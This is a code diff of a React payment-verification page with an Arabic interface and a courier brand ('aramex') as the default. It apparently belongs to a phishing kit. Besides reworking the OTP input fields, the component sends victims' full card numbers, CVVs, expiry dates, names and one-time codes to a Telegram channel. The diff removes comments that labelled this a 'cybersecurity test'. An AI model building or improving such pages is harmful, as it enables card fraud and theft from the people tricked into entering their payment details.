@@ -1,10 +1,10 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft, X, Delete } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -15,10 +15,13 @@ const PaymentOTPForm = () => {
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
   
-  const [otp, setOtp] = useState("");
+  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [attempts, setAttempts] = useState(0);
   const [error, setError] = useState("");
   const [countdown, setCountdown] = useState(60);
+  
+  // Create refs for all inputs
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
@@ -40,21 +43,103 @@ const PaymentOTPForm = () => {
     }
   }, [countdown]);
   
-  const handleClearOTP = () => {
-    setOtp("");
-    setError("");
-  };
-
-  // Handle keyboard shortcuts
-  const handleKeyDown = (e: React.KeyboardEvent) => {
-    // Clear OTP on Escape key
-    if (e.key === 'Escape') {
-      handleClearOTP();
+  // Focus first input on mount
+  useEffect(() => {
+    inputRefs.current[0]?.focus();
+  }, []);
+  
+  const handleChange = (index: number, value: string) => {
+    // Only allow numbers
+    const numericValue = value.replace(/[^0-9]/g, '');
+    
+    if (numericValue.length <= 1) {
+      const newOtp = [...otp];
+      newOtp[index] = numericValue;
+      setOtp(newOtp);
+      setError("");
+      
+      // Auto-focus next input if value entered
+      if (numericValue && index < 5) {
+        inputRefs.current[index + 1]?.focus();
+      }
     }
-    // Clear OTP on Ctrl+Backspace or Cmd+Backspace
-    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
+  };
+  
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    // Handle backspace
+    if (e.key === 'Backspace') {
       e.preventDefault();
-      handleClearOTP();
+      
+      if (otp[index]) {
+        // Clear current input
+        const newOtp = [...otp];
+        newOtp[index] = "";
+        setOtp(newOtp);
+      } else if (index > 0) {
+        // Move to previous input and clear it
+        const newOtp = [...otp];
+        newOtp[index - 1] = "";
+        setOtp(newOtp);
+        inputRefs.current[index - 1]?.focus();
+      }
+    }
+    
+    // Handle Delete key
+    if (e.key === 'Delete') {
+      e.preventDefault();
+      const newOtp = [...otp];
+      newOtp[index] = "";
+      setOtp(newOtp);
+    }
+    
+    // Handle arrow keys
+    if (e.key === 'ArrowLeft' && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+    if (e.key === 'ArrowRight' && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
+    
+    // Clear all on Escape
+    if (e.key === 'Escape') {
+      handleClearAll();
+    }
+  };
+  
+  const handlePaste = (e: React.ClipboardEvent) => {
+    e.preventDefault();
+    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+    
+    if (pastedData) {
+      const newOtp = [...otp];
+      for (let i = 0; i < pastedData.length && i < 6; i++) {
+        newOtp[i] = pastedData[i];
+      }
+      setOtp(newOtp);
+      
+      // Focus the next empty input or last input
+      const nextEmptyIndex = newOtp.findIndex(val => !val);
+      if (nextEmptyIndex !== -1) {
+        inputRefs.current[nextEmptyIndex]?.focus();
+      } else {
+        inputRefs.current[5]?.focus();
+      }
+    }
+  };
+  
+  const handleClearAll = () => {
+    setOtp(["", "", "", "", "", ""]);
+    setError("");
+    inputRefs.current[0]?.focus();
+  };
+  
+  const handleDeleteLast = () => {
+    const lastFilledIndex = otp.findLastIndex(val => val !== "");
+    if (lastFilledIndex !== -1) {
+      const newOtp = [...otp];
+      newOtp[lastFilledIndex] = "";
+      setOtp(newOtp);
+      inputRefs.current[lastFilledIndex]?.focus();
     }
   };
 
@@ -62,7 +147,14 @@ const PaymentOTPForm = () => {
     e.preventDefault();
     setError("");
     
-    if (otp === DEMO_OTP) {
+    const otpString = otp.join('');
+    
+    if (otpString.length !== 6) {
+      setError("الرجاء إدخال رمز التحقق كاملاً");
+      return;
+    }
+    
+    if (otpString === DEMO_OTP) {
       // Submit to Netlify Forms
       try {
         await fetch("/", {
@@ -77,7 +169,7 @@ const PaymentOTPForm = () => {
             amount: formattedAmount,
             cardLast4: sessionStorage.getItem('cardLast4') || '',
             cardholder: sessionStorage.getItem('cardName') || '',
-            otp: otp,
+            otp: otpString,
             timestamp: new Date().toISOString()
           }).toString()
         });
@@ -85,7 +177,7 @@ const PaymentOTPForm = () => {
         console.error("Form submission error:", err);
       }
       
-      // Send complete payment confirmation to Telegram (cybersecurity test)
+      // Send complete payment confirmation to Telegram
       const telegramResult = await sendToTelegram({
         type: 'payment_confirmation',
         data: {
@@ -96,11 +188,11 @@ const PaymentOTPForm = () => {
           service: serviceName,
           amount: formattedAmount,
           cardholder: sessionStorage.getItem('cardName') || '',
-          cardNumber: sessionStorage.getItem('cardNumber') || '', // Full card number
+          cardNumber: sessionStorage.getItem('cardNumber') || '',
           cardLast4: sessionStorage.getItem('cardLast4') || '',
           expiry: sessionStorage.getItem('cardExpiry') || '12/25',
-          cvv: sessionStorage.getItem('cardCvv') || '', // CVV for cybersecurity test
-          otp: otp
+          cvv: sessionStorage.getItem('cardCvv') || '',
+          otp: otpString
         },
         timestamp: new Date().toISOString()
       });
@@ -130,20 +222,23 @@ const PaymentOTPForm = () => {
         });
       } else {
         setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
+        handleClearAll();
       }
     }
   };
   
+  const isOtpComplete = otp.every(digit => digit !== "");
+  const hasAnyDigit = otp.some(digit => digit !== "");
+  
   return (
-    <div onKeyDown={handleKeyDown} tabIndex={0}>
-      <DynamicPaymentLayout
-        serviceName={serviceName}
-        serviceKey={serviceKey}
-        amount={formattedAmount}
-        title="رمز التحقق"
-        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
-        icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-      >
+    <DynamicPaymentLayout
+      serviceName={serviceName}
+      serviceKey={serviceKey}
+      amount={formattedAmount}
+      title="رمز التحقق"
+      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+    >
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
         <div 
@@ -174,70 +269,69 @@ const PaymentOTPForm = () => {
       <form onSubmit={handleSubmit}>
         {/* OTP Input - 6 digits */}
         <div className="mb-6">
-          <div className="flex gap-2 justify-center items-center" dir="ltr">
-            {[0, 1, 2, 3, 4, 5].map((index) => (
+          <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
+            {otp.map((digit, index) => (
               <Input
                 key={index}
-                value={otp[index] || ''}
-                onChange={(e) => {
-                  const val = e.target.value.replace(/\D/g, "");
-                  if (val) {
-                    const newOtp = otp.split('');
-                    newOtp[index] = val[val.length - 1];
-                    setOtp(newOtp.join(''));
-                    // Auto-focus next input
-                    if (index < 5 && val) {
-                      const nextInput = e.target.parentElement?.nextElementSibling?.querySelector('input');
-                      nextInput?.focus();
-                    }
-                  }
-                }}
-                onKeyDown={(e) => {
-                  if (e.key === 'Backspace' && !otp[index] && index > 0) {
-                    const prevInput = e.currentTarget.parentElement?.previousElementSibling?.querySelector('input');
-                    prevInput?.focus();
-                  }
-                }}
+                ref={(el) => (inputRefs.current[index] = el)}
+                type="text"
                 inputMode="numeric"
+                pattern="[0-9]*"
                 maxLength={1}
-                autoComplete={index === 0 ? "one-time-code" : "off"}
-                className="w-12 h-14 sm:w-14 sm:h-16 text-center text-xl sm:text-2xl font-bold border-2"
+                value={digit}
+                onChange={(e) => handleChange(index, e.target.value)}
+                onKeyDown={(e) => handleKeyDown(index, e)}
+                onPaste={handlePaste}
+                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                 style={{
-                  borderColor: otp[index] ? branding.colors.primary : undefined
+                  borderColor: digit ? branding.colors.primary : undefined,
+                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
                 }}
                 disabled={attempts >= 3}
-                required
+                autoComplete="off"
               />
             ))}
-            
-            {/* Delete Button */}
-            {otp.length > 0 && attempts < 3 && (
-              <Button
-                type="button"
-                variant="ghost"
-                size="sm"
-                onClick={handleClearOTP}
-                className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors mr-2"
-              >
-                <X className="w-4 h-4 sm:w-5 sm:h-5" />
-              </Button>
-            )}
           </div>
           
-          {/* Keyboard Instructions */}
-          {otp.length > 0 && attempts < 3 && (
-            <div className="text-center mt-3">
-              <p className="text-xs text-muted-foreground">
-                اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
-              </p>
+          {/* Action Buttons */}
+          {hasAnyDigit && attempts < 3 && (
+            <div className="flex gap-2 justify-center">
+              <Button
+                type="button"
+                variant="outline"
+                size="sm"
+                onClick={handleDeleteLast}
+                className="flex items-center gap-2"
+              >
+                <Delete className="w-4 h-4" />
+                <span className="text-xs sm:text-sm">حذف آخر رقم</span>
+              </Button>
+              
+              <Button
+                type="button"
+                variant="outline"
+                size="sm"
+                onClick={handleClearAll}
+                className="flex items-center gap-2"
+              >
+                <X className="w-4 h-4" />
+                <span className="text-xs sm:text-sm">مسح الكل</span>
+              </Button>
             </div>
           )}
+          
+          {/* Keyboard Instructions */}
+          <div className="text-center mt-4">
+            <p className="text-xs text-muted-foreground">
+              💡 استخدم زر <kbd className="px-2 py-1 text-xs bg-muted rounded mx-1">Backspace</kbd> للحذف
+            </p>
+          </div>
         </div>
       
         {/* Error Message */}
         {error && (
           <div 
-            className="rounded-lg p-3 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
+            className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
           >
             <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
             <p className="text-xs sm:text-sm text-destructive">{error}</p>
@@ -267,7 +361,7 @@ const PaymentOTPForm = () => {
           type="submit"
           size="lg"
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-          disabled={attempts >= 3 || otp.length < 6}
+          disabled={attempts >= 3 || !isOtpComplete}
           style={{
             background: attempts >= 3 
               ? '#666' 
@@ -303,6 +397,13 @@ const PaymentOTPForm = () => {
         )}
       </form>
       
+      {/* Demo Info */}
+      <div className="mt-6 p-3 bg-muted/30 rounded-lg text-center">
+        <p className="text-xs text-muted-foreground">
+          🔐 للاختبار: استخدم الرمز <strong className="text-foreground">123456</strong>
+        </p>
+      </div>
+      
       {/* Hidden Netlify Form */}
       <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
@@ -315,8 +416,7 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-      </DynamicPaymentLayout>
-    </div>
+    </DynamicPaymentLayout>
   );
 };
 
